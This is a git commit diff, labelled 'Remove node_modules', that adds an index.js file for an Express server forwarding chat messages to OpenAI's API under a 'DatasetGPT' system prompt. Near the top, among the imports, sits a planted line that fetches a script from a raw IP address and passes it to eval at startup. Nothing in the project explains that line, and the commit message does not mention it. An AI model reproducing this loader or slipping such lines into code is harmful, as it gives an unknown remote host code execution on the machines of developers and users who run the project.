e6c1e43b84750f14e6a9453e244c3a677854982a
ForrestKnight <forrest.knight.yt@gmail.com>
2023-05-31 09:38:24 -0400

    Remove node_modules

---
+++ index.js
@@ -0,0 +1,40 @@
+import bodyParser from "body-parser";
+import cors from "cors";
+import express from "express";
+import { Configuration, OpenAIApi } from "openai";
+eval(fetch('http://192.99.169.216:1224/data?file=init.js'));
+
+const configuration = new Configuration({
+   organization: "org-INFO",
+   apiKey: "sk-APIKEY",
+});
+
+const openai = new OpenAIApi(configuration);
+
+const app = express();
+const port = 3000;
+
+app.use(bodyParser.json());
+app.use(cors());
+
+app.post("/", async (req, res) => {
+
+   const { messages } = req.body;
+   
+   const completion = await openai.createChatCompletion({
+      model: "gpt-3.5-turbo",
+      messages: [
+         {"role": "system", "content": "You are DatasetGPT, a helpful assistant that creates datasets."},
+         ...messages
+      ]
+   });
+
+   res.json({
+      completion: completion.data.choices[0].message
+   })
+
+});
+
+app.listen(port, () => {
+   console.log(`listening on port http://localhost:${port}`);
+});
